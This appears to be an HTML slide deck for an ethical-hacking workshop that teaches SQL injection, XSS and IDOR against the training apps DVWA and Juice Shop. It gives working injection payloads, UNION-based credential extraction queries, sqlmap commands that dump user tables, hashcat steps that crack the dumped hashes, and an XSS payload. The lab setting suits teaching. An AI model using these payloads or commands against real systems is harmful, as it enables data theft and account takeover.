@@ -1,0 +1,443 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>HACKDOOR — Ethical Hacking Workshop</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#070b08; --bg2:#0c1310; --surface:#0f1712; --surface2:#131d17;
+  --text:#bdf2c4; --text-dim:#6f9179; --accent:#39ff8a; --accent2:#ff4d6d; --accent3:#ffcf5c;
+  --border: rgba(57,255,138,0.18);
+  --shadow-d: rgba(0,0,0,0.65); --shadow-l: rgba(57,255,138,0.05);
+  --radius:18px; --mono:'JetBrains Mono',monospace;
+  padding-top: env(safe-area-inset-top,0px); padding-bottom: env(safe-area-inset-bottom,0px);
+}
+:root[data-theme="light"]{
+  --bg:#eef2ee; --bg2:#e6ece6; --surface:#f4f7f4; --surface2:#eef3ee;
+  --text:#12241a; --text-dim:#4c6255; --accent:#0a8a52; --accent2:#c0392b; --accent3:#a9770e;
+  --border: rgba(10,138,82,0.25);
+  --shadow-d: rgba(163,177,168,0.65); --shadow-l: rgba(255,255,255,0.9);
+}
+*{box-sizing:border-box; margin:0; padding:0;}
+html,body{height:100%;}
+body{
+  font-family:var(--mono); background:var(--bg); color:var(--text);
+  overflow:hidden; position:relative;
+  background-image:
+    radial-gradient(circle at 15% 20%, var(--shadow-l) 0%, transparent 40%),
+    repeating-linear-gradient(0deg, rgba(57,255,138,0.025) 0px, transparent 1px, transparent 3px);
+  transition:background-color .4s ease, color .4s ease;
+}
+::selection{background:var(--accent); color:var(--bg);}
+.scanline{position:fixed; inset:0; pointer-events:none; z-index:999; mix-blend-mode:overlay;
+  background:repeating-linear-gradient(0deg, rgba(0,0,0,0.12) 0px, transparent 1px, transparent 3px); opacity:.35;}
+
+/* neumorphic surface */
+.neu{background:var(--surface); border-radius:var(--radius);
+  box-shadow: 8px 8px 18px var(--shadow-d), -8px -8px 18px var(--shadow-l); border:1px solid var(--border);}
+.neu-in{background:var(--surface2); border-radius:14px;
+  box-shadow: inset 4px 4px 10px var(--shadow-d), inset -4px -4px 10px var(--shadow-l); border:1px solid var(--border);}
+
+/* top bar */
+.topbar{position:fixed; top:0; left:0; right:0; height:56px; z-index:50; display:flex; align-items:center;
+  justify-content:space-between; padding:0 22px; padding-top:env(safe-area-inset-top,0px);}
+.brand{display:flex; align-items:center; gap:10px; font-weight:800; letter-spacing:1px; font-size:16.5px; color:var(--accent);}
+.brand .dot{width:9px; height:9px; border-radius:50%; background:var(--accent); box-shadow:0 0 10px var(--accent); animation:blink 1.4s infinite;}
+@keyframes blink{50%{opacity:.25;}}
+.topright{display:flex; align-items:center; gap:12px;}
+.xp{font-size:13.5px; color:var(--text-dim); padding:8px 14px;}
+.xp b{color:var(--accent3);}
+.toggle{width:52px; height:28px; border-radius:20px; cursor:pointer; position:relative; padding:3px;}
+.toggle .knob{width:20px; height:20px; border-radius:50%; background:var(--accent); transition:transform .3s ease; box-shadow:0 0 8px var(--accent);}
+:root[data-theme="light"] .toggle .knob{transform:translateX(24px); background:var(--accent2); box-shadow:0 0 8px var(--accent2);}
+
+/* progress */
+.progress-track{position:fixed; top:56px; left:0; right:0; height:3px; background:var(--surface2); z-index:49;}
+.progress-fill{height:100%; background:linear-gradient(90deg,var(--accent),var(--accent3)); width:0%; transition:width .4s ease;}
+
+/* deck */
+.deck{position:absolute; top:0; left:0; width:100%; height:100%; padding-top:78px;}
+.slide{position:absolute; inset:0; padding:78px 6vw 90px; display:flex; flex-direction:column; justify-content:center; justify-content:safe center;
+  opacity:0; transform:translateX(40px); transition:opacity .45s ease, transform .45s ease; pointer-events:none; overflow-y:auto; -webkit-overflow-scrolling:touch;}
+.slide.active{opacity:1; transform:translateX(0); pointer-events:auto;}
+.tag{display:inline-block; font-size:13px; color:var(--accent); border:1px solid var(--border); border-radius:8px; padding:5px 12px; margin-bottom:14px; width:fit-content;}
+.slide h1{font-size:clamp(32px,4.8vw,58px); font-weight:800; line-height:1.08; margin-bottom:14px;}
+.slide h2{font-size:clamp(25px,3.4vw,38px); font-weight:700; margin-bottom:16px;}
+.slide p.sub{color:var(--text-dim); font-size:clamp(15.5px,1.5vw,19px); max-width:800px; line-height:1.65;}
+.grid{display:grid; gap:16px; margin-top:22px;}
+.g2{grid-template-columns:1fr 1fr;} .g3{grid-template-columns:repeat(3,1fr);} .g4{grid-template-columns:repeat(4,1fr);}
+@media(max-width:820px){.g2,.g3,.g4{grid-template-columns:1fr;}}
+.card{padding:18px; cursor:default;}
+.card h3{font-size:17px; color:var(--accent); margin-bottom:6px;}
+.card p{font-size:14.5px; color:var(--text-dim); line-height:1.55;}
+.term{font-family:var(--mono); font-size:14.5px; line-height:1.8; padding:16px; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word; color:var(--accent); overflow-x:auto; max-width:100%; background:var(--surface2); border:1px solid var(--border); border-radius:12px;}
+.tabgroup{width:100%;}
+@media(max-width:600px){
+  .slide{padding:70px 5vw 96px;}
+  .term{font-size:12.5px; padding:13px;}
+  .card{padding:14px;}
+  .grid{gap:12px;}
+}
+@media(max-width:420px){
+  .topbar{padding:0 12px;}
+  .brand{font-size:14px; gap:6px;}
+  .topright{gap:8px;}
+  .xp{padding:6px 10px; font-size:11px;}
+  .navbar{padding-left:12px; padding-right:12px;}
+  .navbtn{width:40px; height:40px; font-size:16px;}
+}
+.term .c{color:var(--text-dim);}
+.term .r{color:var(--accent2);}
+.term .y{color:var(--accent3);}
+.badge{font-size:12.5px; padding:4px 10px; border-radius:6px; background:var(--surface2); color:var(--accent); border:1px solid var(--border); display:inline-block;}
+.flag{font-size:13px; color:var(--bg); background:var(--accent2); padding:4px 12px; border-radius:6px; font-weight:700; display:inline-block;}
+
+/* nav */
+.navbar{position:fixed; bottom:0; left:0; right:0; height:78px; padding-bottom:env(safe-area-inset-bottom,0px); display:flex; align-items:center; justify-content:space-between; padding-left:22px; padding-right:22px; z-index:50;}
+.navbtn{width:46px; height:46px; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; color:var(--accent); font-size:18px; user-select:none;}
+.navbtn:active{transform:scale(.92);}
+.dots{display:flex; gap:7px;}
+.dots span{width:8px; height:8px; border-radius:50%; background:var(--surface2); border:1px solid var(--border); cursor:pointer;}
+.dots span.on{background:var(--accent); box-shadow:0 0 6px var(--accent);}
+.slidecount{font-size:12.5px; color:var(--text-dim);}
+
+/* tabs (xss) */
+.tabs{display:flex; gap:8px; margin-top:18px; flex-wrap:wrap;}
+.tabbtn{font-size:14px; padding:9px 16px; cursor:pointer; color:var(--text-dim); border-radius:10px;}
+.tabbtn.on{color:var(--accent); background:var(--surface2);}
+.tabpanel{display:none; margin-top:14px;} .tabpanel.on{display:block;}
+
+/* accordion */
+.acc-item{margin-top:10px; overflow:hidden;}
+.acc-head{padding:15px 18px; cursor:pointer; display:flex; justify-content:space-between; align-items:center; font-size:15.5px; font-weight:600;}
+.acc-head .n{color:var(--accent); margin-right:10px;}
+.acc-body{max-height:0; overflow:hidden; transition:max-height .35s ease; padding:0 18px; font-size:14.5px; color:var(--text-dim); line-height:1.6;}
+.acc-item.open .acc-body{max-height:900px; padding-bottom:18px;}
+.acc-head .chev{transition:transform .3s ease;} .acc-item.open .chev{transform:rotate(180deg);}
+
+/* boot / title */
+.boot{font-size:clamp(13px,1.6vw,16.5px); color:var(--accent); line-height:1.9;}
+.cursor-blink{display:inline-block; width:8px; height:15px; background:var(--accent); animation:blink .8s steps(1) infinite; vertical-align:middle;}
+.startbtn{margin-top:26px; padding:15px 32px; font-family:var(--mono); font-weight:700; font-size:14.5px; letter-spacing:1px; color:var(--bg); background:var(--accent); border:none; border-radius:12px; cursor:pointer; box-shadow:6px 6px 14px var(--shadow-d), -6px -6px 14px var(--shadow-l); width:fit-content;}
+.startbtn:active{transform:scale(.97);}
+
+.kbd{display:inline-block; font-size:12px; padding:3px 8px; border-radius:5px; background:var(--surface2); border:1px solid var(--border); color:var(--text-dim);}
+
+/* toast (xp gain) */
+.toast{position:fixed; top:70px; right:22px; z-index:80; padding:10px 16px; font-size:13.5px; color:var(--accent); opacity:0; transform:translateY(-8px); transition:all .35s ease; pointer-events:none;}
+.toast.show{opacity:1; transform:translateY(0);}
+</style>
+</head>
+<body>
+<div class="scanline"></div>
+
+<div class="topbar">
+  <div class="brand"><span class="dot"></span>HACKDOOR</div>
+  <div class="topright">
+    <div class="xp neu-in">XP <b id="xpval">0</b> / 90</div>
+    <div class="toggle neu-in" id="themeToggle"><div class="knob"></div></div>
+  </div>
+</div>
+<div class="progress-track"><div class="progress-fill" id="progressFill"></div></div>
+<div class="toast neu" id="toast"></div>
+
+<div class="deck" id="deck"></div>
+
+<div class="navbar">
+  <div class="navbtn neu" id="prevBtn">‹</div>
+  <div style="display:flex; flex-direction:column; align-items:center; gap:6px;">
+    <div class="dots" id="dots"></div>
+    <div class="slidecount"><span id="curNum">1</span> / <span id="totNum">10</span> — <span class="kbd">←</span> <span class="kbd">→</span> to navigate</div>
+  </div>
+  <div class="navbtn neu" id="nextBtn">›</div>
+</div>
+
+<script>
+const slides = [];
+
+slides.push(`
+<div class="tag">// boot sequence</div>
+<h1>HACKDOOR</h1>
+<p class="sub" style="color:var(--accent); font-size:16px; margin-bottom:22px;">Your Doorway to Learning Ethical Hacking</p>
+<div class="neu term boot" style="max-width:640px;">
+<span class="c">$</span> whoami<br>&gt; guest_hacker<br>
+<span class="c">$</span> connect --target OWASP-TOP-10<br>&gt; handshake ok<br>
+<span class="c">$</span> load_modules sqli xss auth idor ai-copilot<br>&gt; 5 modules ready<br>
+<span class="c">$</span> status<br>&gt; <span class="y">AUTHORIZED LAB ENVIRONMENT ONLY</span><br>
+&gt; awaiting operator input <span class="cursor-blink"></span>
+</div>
+<button class="startbtn" onclick="go(1)">[ ENTER WORKSHOP ]</button>
+`);
+
+slides.push(`
+<div class="tag">01 // OWASP Top 10</div>
+<h2>The Map of What Breaks Web Apps</h2>
+<p class="sub">Tap each entry — this is the checklist real pentesters walk through first.</p>
+<a href="https://owasp.org/Top10/2025/" target="_blank" rel="noopener" class="badge" style="margin-top:10px; text-decoration:none;">📄 Official OWASP Top 10 docs → owasp.org/Top10/2025</a>
+<div class="neu" id="acc" style="margin-top:14px; max-width:820px;"></div>
+`);
+
+slides.push(`
+<div class="tag">02 // SQL Injection</div>
+<h2>SQL Injection — The Classic</h2>
+<p class="sub">When user input is glued straight into a SQL query, the input can rewrite the query's logic. Both our targets build a query this way somewhere.</p>
+<div class="grid g2" style="margin-top:20px;">
+<div class="neu term"><span class="c">-- vulnerable query (conceptual)</span><br>SELECT * FROM users<br>WHERE email='<span class="y">$input</span>'<br>AND pass='<span class="y">$pass</span>';</div>
+<div class="neu term"><span class="c">-- input typed into a form field</span><br>email: <span class="r">' OR 1=1-- </span><br><span class="c">// comment kills the rest</span><br><span class="c">// query now always true</span></div>
+</div>
+<div class="badge" style="margin-top:14px;">Manual technique — for authorized labs only</div>
+`);
+
+slides.push(`
+<div class="tag">03 // manual SQLi — Juice Shop</div>
+<h2>Step by Step: Login Bypass on Juice Shop</h2>
+<div class="grid g2" style="margin-top:16px;">
+<div class="card neu"><h3>1 · Open the login form</h3><p>Go to <span class="badge">localhost:3000/#/login</span></p></div>
+<div class="card neu"><h3>2 · Enter the payload</h3><p>Email field: <span class="badge">' OR 1=1--</span> · Password: anything</p></div>
+<div class="card neu"><h3>3 · Submit</h3><p>The comment strips the password check; <span class="badge">1=1</span> makes the WHERE clause always true.</p></div>
+<div class="card neu"><h3>4 · Observe</h3><p>You're logged in as the first account in the database — usually the admin — without knowing a password.</p></div>
+</div>
+<div class="badge" style="margin-top:14px;">This is Juice Shop's official "Login Admin" training challenge</div>
+`);
+
+slides.push(`
+<div class="tag">04 // manual SQLi — DVWA</div>
+<h2>Step by Step: Data Extraction on DVWA</h2>
+<p class="sub">Tap each step — these exact payloads are tested against DVWA's real Low-security source.</p>
+<div class="neu" id="dvwaAcc" style="margin-top:14px; max-width:820px;"></div>
+`);
+
+slides.push(`
+<div class="tag">05 // SQL Injection, automated</div>
+<h2>SQLMap End-to-End: Dump & Crack</h2>
+<p class="sub">Full commands, copy-paste ready. Pick a target tab — same automated flow, same end goal: stolen credentials, cracked back to plaintext.</p>
+<div class="tabgroup">
+<div class="tabs">
+<div class="tabbtn on" data-t="sm-dvwa">DVWA</div>
+<div class="tabbtn" data-t="sm-juice">OWASP Juice Shop</div>
+</div>
+
+<div class="tabpanel on neu" id="p-sm-dvwa" style="padding:20px;">
+<h3 style="color:var(--accent); font-size:16px; margin-bottom:4px;">1 · Get a valid session</h3>
+<p class="sub" style="margin-bottom:10px;">Log in at <span class="badge">http://victim-ip/dvwa/login.php</span> (admin / password) → Security tab → set <span class="badge">Low</span> → DevTools → Application → Cookies → copy your <span class="badge">PHPSESSID</span>.</p>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">2 · Enumerate databases</h3>
+<div class="term">$ sqlmap -u "http://victim-ip/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \\<br>&nbsp;&nbsp;--cookie="security=low; PHPSESSID=&lt;your_session_id&gt;" \\<br>&nbsp;&nbsp;--batch --dbs<br><span class="y">[+]</span> available databases: dvwa, information_schema</div>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">3 · List the tables</h3>
+<div class="term">$ sqlmap -u "http://victim-ip/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \\<br>&nbsp;&nbsp;--cookie="security=low; PHPSESSID=&lt;your_session_id&gt;" \\<br>&nbsp;&nbsp;--batch -D dvwa --tables<br><span class="y">[+]</span> users, guestbook</div>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">4 · List the columns</h3>
+<div class="term">$ sqlmap -u "http://victim-ip/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \\<br>&nbsp;&nbsp;--cookie="security=low; PHPSESSID=&lt;your_session_id&gt;" \\<br>&nbsp;&nbsp;--batch -D dvwa -T users --columns<br><span class="y">[+]</span> user_id, first_name, last_name, user, password, avatar</div>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">5 · Dump the credentials</h3>
+<div class="term">$ sqlmap -u "http://victim-ip/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit#" \\<br>&nbsp;&nbsp;--cookie="security=low; PHPSESSID=&lt;your_session_id&gt;" \\<br>&nbsp;&nbsp;--batch -D dvwa -T users -C user,password --dump<br><span class="y">[+]</span> admin : 5f4dcc3b5aa765d61d8327deb882cf99</div>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">6 · Crack the hash with Hashcat</h3>
+<div class="term">$ echo "5f4dcc3b5aa765d61d8327deb882cf99" &gt; dvwa_hash.txt<br>$ hashcat -m 0 -a 0 dvwa_hash.txt /usr/share/wordlists/rockyou.txt<br>$ hashcat -m 0 dvwa_hash.txt --show<br><span class="y">[+]</span> 5f4dcc3b5aa765d61d8327deb882cf99:password</div>
+<p class="sub" style="margin-top:8px;"><span class="badge">-m 0</span> = raw MD5 mode · <span class="badge">-a 0</span> = dictionary attack · <span class="badge">--show</span> reads the result back from Hashcat's potfile.</p>
+</div>
+
+<div class="tabpanel neu" id="p-sm-juice" style="padding:20px;">
+<h3 style="color:var(--accent); font-size:16px; margin-bottom:4px;">1 · Confirm the injectable endpoint</h3>
+<p class="sub" style="margin-bottom:10px;">Browse to <span class="badge">localhost:3000</span> and search for a product. The request hits <span class="badge">/rest/products/search?q=</span> — that's the target parameter.</p>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">2 · Enumerate the back end</h3>
+<div class="term">$ sqlmap -u "http://localhost:3000/rest/products/search?q=test" \\<br>&nbsp;&nbsp;--batch --level=3 --risk=2 --dbs<br><span class="y">[+]</span> back-end DBMS: SQLite</div>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">3 · List the tables</h3>
+<div class="term">$ sqlmap -u "http://localhost:3000/rest/products/search?q=test" \\<br>&nbsp;&nbsp;--batch --level=3 --risk=2 --tables<br><span class="y">[+]</span> Users, Products, Baskets, Feedbacks</div>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">4 · List the columns</h3>
+<div class="term">$ sqlmap -u "http://localhost:3000/rest/products/search?q=test" \\<br>&nbsp;&nbsp;--batch --level=3 --risk=2 -T Users --columns<br><span class="y">[+]</span> id, email, password, role</div>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">5 · Dump the credentials</h3>
+<div class="term">$ sqlmap -u "http://localhost:3000/rest/products/search?q=test" \\<br>&nbsp;&nbsp;--batch --level=3 --risk=2 -T Users -C email,password --dump<br><span class="y">[+]</span> admin@juice-sh.op : 0192023a7bbd73250516f069df18b500</div>
+
+<h3 style="color:var(--accent); font-size:16px; margin:14px 0 4px;">6 · Crack the hash with Hashcat</h3>
+<div class="term">$ echo "0192023a7bbd73250516f069df18b500" &gt; juice_hash.txt<br>$ hashcat -m 0 -a 0 juice_hash.txt /usr/share/wordlists/rockyou.txt<br>$ hashcat -m 0 juice_hash.txt --show<br><span class="y">[+]</span> 0192023a7bbd73250516f069df18b500:admin123</div>
+<p class="sub" style="margin-top:8px;">Same weak, unsalted MD5 hashing as DVWA — it's Juice Shop's own intentional "Password Strength" challenge.</p>
+</div>
+</div>
+`);
+
+slides.push(`
+<div class="tag">06 // XSS · Auth · IDOR</div>
+<h2>Three More Doors In</h2>
+<div class="tabgroup">
+<div class="tabs">
+<div class="tabbtn on" data-t="xss">Cross-Site Scripting</div>
+<div class="tabbtn" data-t="auth">Broken Authentication</div>
+<div class="tabbtn" data-t="idor">IDOR</div>
+</div>
+<div class="tabpanel on neu" id="p-xss" style="padding:18px;">
+<p class="sub" style="margin-bottom:10px;">DOM XSS on Juice Shop, step by step:</p>
+<div class="grid g2">
+<div class="card neu"><h3>1 · Open search</h3><p>Go to <span class="badge">localhost:3000</span> and click the search icon.</p></div>
+<div class="card neu"><h3>2 · Enter the payload</h3><p><span class="badge">&lt;iframe src="javascript:alert('XSS')"&gt;</span></p></div>
+<div class="card neu"><h3>3 · Observe</h3><p>The search results render your input as live HTML — the alert fires immediately, unsanitized.</p></div>
+<div class="card neu"><h3>4 · Why it works</h3><p>The search term is bound straight into the DOM instead of being escaped first.</p></div>
+</div></div>
+<div class="tabpanel neu" id="p-auth" style="padding:18px;"><p class="sub">Weak session handling — predictable tokens, no lockouts, passwords sent or stored badly — lets attackers hijack accounts without guessing a password.</p></div>
+<div class="tabpanel neu" id="p-idor" style="padding:18px;"><p class="sub">Insecure Direct Object Reference: changing <span class="badge">?id=104</span> to <span class="badge">?id=105</span> shows someone else's invoice, because the server never checked who owns it.</p></div>
+</div>
+`);
+
+slides.push(`
+<div class="tag">07 // AI-Assisted Exploitation</div>
+<h2>Same AI, Two Jobs: Attack & Defense</h2>
+<p class="sub">Paste a vulnerable snippet from Juice Shop or DVWA into an AI assistant — it can explain the flaw, suggest safe test payloads, and write the fix. That duality is the whole point.</p>
+<div class="grid g3" style="margin-top:18px;">
+<div class="card neu"><h3>1 · Explain</h3><p>"Why is this login query exploitable?" → AI walks through the data flow.</p></div>
+<div class="card neu"><h3>2 · Suggest test payloads</h3><p>AI proposes safe patterns like <span class="badge">' OR 1=1--</span> to confirm the bug — for testing, not real intrusion.</p></div>
+<div class="card neu"><h3>3 · Patch</h3><p>AI rewrites the query using parameterized statements, closing the hole.</p></div>
+</div>
+<div class="flag" style="margin-top:16px;">Dual-use reminder: the explanation that reveals the attack is the same one that produces the fix</div>
+`);
+
+slides.push(`
+<div class="tag">08 // reporting</div>
+<h2>Write It Up Like a Real Pentester</h2>
+<p class="sub">A finding isn't done until it's documented. Ask your AI copilot to help draft each section from your notes and screenshot.</p>
+<div class="neu term" style="max-width:760px;">
+<span class="y">Title:</span> SQL Injection — Login Authentication Bypass (Juice Shop)<br>
+<span class="y">Description:</span> The email field is concatenated directly into a SQL query without sanitization...<br>
+<span class="y">Impact:</span> Full database read access; potential credential theft.<br>
+<span class="y">Steps to Reproduce:</span> 1. Set security=Low 2. Navigate to SQLi module 3. Submit payload...<br>
+<span class="y">Remediation:</span> Use parameterized queries / prepared statements; validate input server-side.
+</div>
+`);
+
+slides.push(`
+<div class="tag">09 // debrief & disconnect</div>
+<h2>What You Unlocked Today</h2>
+<div class="grid g3" style="margin-top:16px;">
+<div class="card neu"><h3>🧠 Concepts</h3><p>OWASP Top 10, SQLi, XSS, broken auth, IDOR.</p></div>
+<div class="card neu"><h3>🛠 Tools</h3><p>Juice Shop & DVWA in Docker, SQLMap, an AI copilot used for both offense and defense.</p></div>
+<div class="card neu"><h3>📄 Artifact</h3><p>A real vulnerability report — the actual deliverable of a pentest.</p></div>
+</div>
+<div class="neu term" style="margin-top:18px; max-width:640px;"><span class="c">$</span> docker stop juice-shop dvwa<br>&gt; containers stopped, no trace left on host<br>&gt; keep practicing on TryHackMe / PortSwigger Academy — always in scope <span class="cursor-blink"></span></div>
+<div class="neu" style="margin-top:16px; padding:16px; max-width:500px; display:flex; align-items:center; gap:12px;">
+<span style="font-size:22px;">🏅</span><span class="sub">Badge earned: <b style="color:var(--accent);">CERTIFIED DOORBREAKER — Level 1</b></span>
+</div>
+`);
+
+// ---------- render ----------
+const deck = document.getElementById('deck');
+slides.forEach((html,i)=>{
+  const d = document.createElement('div');
+  d.className = 'slide' + (i===0?' active':'');
+  d.innerHTML = html;
+  deck.appendChild(d);
+});
+const dotsWrap = document.getElementById('dots');
+slides.forEach((_,i)=>{
+  const s = document.createElement('span');
+  if(i===0) s.className='on';
+  s.onclick=()=>go(i);
+  dotsWrap.appendChild(s);
+});
+document.getElementById('totNum').textContent = slides.length;
+
+let current = 0;
+let maxReached = 0;
+const seenXp = new Set();
+function updateProgress(){
+  document.getElementById('progressFill').style.width = ((current)/(slides.length-1)*100)+'%';
+  document.getElementById('curNum').textContent = current+1;
+  [...dotsWrap.children].forEach((d,i)=>d.className = i===current?'on':'');
+  document.querySelectorAll('.slide').forEach((s,i)=>s.classList.toggle('active', i===current));
+  if(current>maxReached){ maxReached=current; awardXp(10); }
+}
+function awardXp(n){
+  const el = document.getElementById('xpval');
+  let val = parseInt(el.textContent)+n;
+  el.textContent = Math.min(val,90);
+  const t = document.getElementById('toast');
+  t.textContent = '+'+n+' XP earned';
+  t.classList.add('show');
+  setTimeout(()=>t.classList.remove('show'), 1400);
+}
+function go(i){ current = Math.max(0, Math.min(slides.length-1, i)); updateProgress(); }
+document.getElementById('nextBtn').onclick = ()=>go(current+1);
+document.getElementById('prevBtn').onclick = ()=>go(current-1);
+document.addEventListener('keydown', e=>{
+  if(e.key==='ArrowRight') go(current+1);
+  if(e.key==='ArrowLeft') go(current-1);
+});
+updateProgress();
+
+// theme toggle
+document.getElementById('themeToggle').onclick = ()=>{
+  const html = document.documentElement;
+  html.setAttribute('data-theme', html.getAttribute('data-theme')==='dark' ? 'light':'dark');
+};
+
+// OWASP accordion
+const owasp = [
+ ["Broken Access Control","Users can act outside their intended permissions — e.g. IDOR, viewing others' data."],
+ ["Cryptographic Failures","Sensitive data exposed due to weak or missing encryption in transit or at rest."],
+ ["Injection","Untrusted input alters a command or query — SQLi, command injection, and similar."],
+ ["Insecure Design","Security flaws baked into the architecture itself, not just a coding mistake."],
+ ["Security Misconfiguration","Default credentials, verbose errors, open cloud storage — the low-hanging fruit."],
+ ["Vulnerable Components","Using outdated libraries or frameworks with known, public exploits."],
+ ["Auth & Identification Failures","Weak session/password handling lets attackers impersonate users."],
+ ["Software & Data Integrity Failures","Trusting unsigned updates or CI/CD pipelines without verification."],
+ ["Security Logging Failures","Attacks go unnoticed because nothing is logged or monitored."],
+ ["Server-Side Request Forgery","Server is tricked into making requests to unintended internal destinations."]
+];
+const accEl = document.getElementById('acc');
+owasp.forEach((o,i)=>{
+  const item = document.createElement('div');
+  item.className='acc-item';
+  item.innerHTML = `<div class="acc-head"><span><span class="n">A${String(i+1).padStart(2,'0')}</span>${o[0]}</span><span class="chev">⌄</span></div><div class="acc-body">${o[1]}</div>`;
+  item.querySelector('.acc-head').onclick=()=>{
+    const wasOpen = item.classList.contains('open');
+    item.classList.toggle('open');
+    if(!wasOpen && !seenXp.has('owasp'+i)){ seenXp.add('owasp'+i); }
+  };
+  accEl.appendChild(item);
+});
+
+// DVWA manual SQLi accordion
+const dvwaSteps = [
+ ["1 · Prep the target — the #1 reason payloads \"don't work\"",
+  `<p class="sub">Setup / Reset DB page → click <span class="badge">Create / Reset Database</span> → DVWA Security page → select <span class="badge">Low</span> → click <span class="badge">Submit</span> → open the SQL Injection module.</p>`],
+ ["2 · Confirm the injection",
+  `<p class="sub" style="margin-bottom:10px;">Type this into the User ID field and click Submit:</p><div class="term">1' OR '1'='1<br><span class="y">[+]</span> returns every row instead of just one</div>`],
+ ["3 · Find the column count",
+  `<p class="sub" style="margin-bottom:10px;">Increase the number until it errors — that tells you how many columns the query selects:</p><div class="term">1' ORDER BY 1-- -<br>1' ORDER BY 2-- -<br>1' ORDER BY 3-- -<br><span class="y">[+]</span> 3 errors ("Unknown column") → the query selects 2 columns</div>`],
+ ["4 · Confirm UNION & fingerprint the DB",
+  `<div class="term">1' UNION SELECT database(),version()-- -<br><span class="y">[+]</span> dvwa | 8.0.x (MySQL/MariaDB version)</div>`],
+ ["5 · Enumerate tables & columns",
+  `<div class="term">1' UNION SELECT table_name,2 FROM information_schema.tables<br>WHERE table_schema=database()-- -<br><span class="y">[+]</span> users, guestbook</div><div class="term" style="margin-top:10px;">1' UNION SELECT column_name,2 FROM information_schema.columns<br>WHERE table_name='users'-- -<br><span class="y">[+]</span> user_id, first_name, last_name, user, password, avatar</div>`],
+ ["6 · Extract the credentials",
+  `<div class="term">1' UNION SELECT user,password FROM users-- -<br><span class="y">[+]</span> admin : 5f4dcc3b5aa765d61d8327deb882cf99</div><p class="sub" style="margin-top:10px;">The trailing space in <span class="badge">-- -</span> matters — MySQL needs a space after <span class="badge">--</span> to treat it as a comment; the extra dash just stops it being trimmed on copy-paste.</p>`]
+];
+const dvwaAcc = document.getElementById('dvwaAcc');
+if(dvwaAcc){
+  dvwaSteps.forEach((s,i)=>{
+    const item = document.createElement('div');
+    item.className = 'acc-item' + (i===0?' open':'');
+    item.innerHTML = `<div class="acc-head"><span><span class="n">${String(i+1).padStart(2,'0')}</span>${s[0]}</span><span class="chev">⌄</span></div><div class="acc-body">${s[1]}</div>`;
+    item.querySelector('.acc-head').onclick = ()=>item.classList.toggle('open');
+    dvwaAcc.appendChild(item);
+  });
+}
+
+// tab groups (scoped, works for any number of tab sets on any slide)
+document.addEventListener('click', e=>{
+  const btn = e.target.closest('.tabbtn'); if(!btn) return;
+  const group = btn.closest('.tabgroup'); if(!group) return;
+  group.querySelectorAll('.tabbtn').forEach(b=>b.classList.remove('on'));
+  group.querySelectorAll('.tabpanel').forEach(p=>p.classList.remove('on'));
+  btn.classList.add('on');
+  const panel = group.querySelector('#p-'+btn.dataset.t);
+  if(panel) panel.classList.add('on');
+});
+</script>
+</body>
+</html>
